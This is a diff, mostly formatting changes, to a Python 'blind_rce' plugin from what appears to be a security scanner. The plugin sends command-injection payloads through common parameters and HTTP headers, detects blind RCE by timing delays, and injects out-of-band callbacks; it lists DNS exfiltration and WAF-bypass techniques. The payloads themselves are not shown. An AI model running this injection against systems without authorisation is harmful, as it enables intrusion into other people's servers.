@@ -1,13 +1,29 @@
 # plugins/blind_rce.py — Cascavel 2026 Intelligence
-import requests
 import time
-import urllib.parse
 
+import requests
 
 PARAMS = [
-    "cmd", "exec", "command", "run", "ping", "ip", "host",
-    "file", "path", "url", "action", "do", "query", "target",
-    "daemon", "dir", "load", "func", "process", "log",
+    "cmd",
+    "exec",
+    "command",
+    "run",
+    "ping",
+    "ip",
+    "host",
+    "file",
+    "path",
+    "url",
+    "action",
+    "do",
+    "query",
+    "target",
+    "daemon",
+    "dir",
+    "load",
+    "func",
+    "process",
+    "log",
 ]
 
 # ──────────── TIME-BASED SLEEP PAYLOADS ────────────
@@ -79,15 +95,20 @@ def _test_sleep(target, param, payload, method, threshold):
 
             if elapsed > threshold:
                 return {
-                    "tipo": "BLIND_RCE", "metodo_http": http_method,
-                    "tecnica": method, "parametro": param,
-                    "tempo": float(f"{elapsed:.2f}"), "severidade": "CRITICO",
+                    "tipo": "BLIND_RCE",
+                    "metodo_http": http_method,
+                    "tecnica": method,
+                    "parametro": param,
+                    "tempo": float(f"{elapsed:.2f}"),
+                    "severidade": "CRITICO",
                     "descricao": f"Blind RCE confirmada via {method} ({http_method})!",
                 }
         except requests.exceptions.Timeout:
             return {
-                "tipo": "BLIND_RCE_TIMEOUT", "metodo_http": http_method,
-                "tecnica": method, "parametro": param,
+                "tipo": "BLIND_RCE_TIMEOUT",
+                "metodo_http": http_method,
+                "tecnica": method,
+                "parametro": param,
                 "severidade": "ALTO",
                 "descricao": f"Timeout após injection de {method} — possível RCE!",
             }
@@ -103,18 +124,17 @@ def _inject_oob(target, param):
         for http_method in ["GET", "POST"]:
             try:
                 if http_method == "GET":
-                    requests.get(f"http://{target}/",
-                                  params={param: payload}, timeout=5)
+                    requests.get(f"http://{target}/", params={param: payload}, timeout=5)
                 else:
-                    requests.post(f"http://{target}/",
-                                   data={param: payload}, timeout=5)
+                    requests.post(f"http://{target}/", data={param: payload}, timeout=5)
                 injected.append({"tecnica": method, "http": http_method, "payload": payload[:60]})
                 break
             except Exception:
                 continue
     if injected:
         return {
-            "tipo": "BLIND_RCE_OOB_INJECTED", "parametro": param,
+            "tipo": "BLIND_RCE_OOB_INJECTED",
+            "parametro": param,
             "severidade": "ALTO",
             "descricao": "OOB callbacks injetados — verificar DNS/HTTP logs para confirmação",
             "payloads_injetados": injected,
@@ -145,15 +165,19 @@ def _test_header_blind(target):
             elapsed = time.time() - start
             if elapsed > 4.5:
                 return {
-                    "tipo": "BLIND_RCE_HEADER", "header": header,
-                    "tecnica": method, "severidade": "CRITICO",
+                    "tipo": "BLIND_RCE_HEADER",
+                    "header": header,
+                    "tecnica": method,
+                    "severidade": "CRITICO",
                     "tempo": round(elapsed, 2),
                     "descricao": f"Blind RCE via header {header} ({method})!",
                 }
         except requests.Timeout:
             return {
-                "tipo": "BLIND_RCE_HEADER_TIMEOUT", "header": header,
-                "tecnica": method, "severidade": "ALTO",
+                "tipo": "BLIND_RCE_HEADER_TIMEOUT",
+                "header": header,
+                "tecnica": method,
+                "severidade": "ALTO",
             }
         except Exception:
             continue
@@ -200,7 +224,14 @@ def run(target, ip, open_ports, banners):
     return {
         "plugin": "blind_rce",
         "versao": "2026.1",
-        "tecnicas": ["time_based", "oob_callback", "dns_exfil", "encoding_bypass",
-                      "shellshock", "header_injection", "waf_bypass"],
+        "tecnicas": [
+            "time_based",
+            "oob_callback",
+            "dns_exfil",
+            "encoding_bypass",
+            "shellshock",
+            "header_injection",
+            "waf_bypass",
+        ],
         "resultados": vulns if vulns else "Nenhum blind RCE detectado",
     }
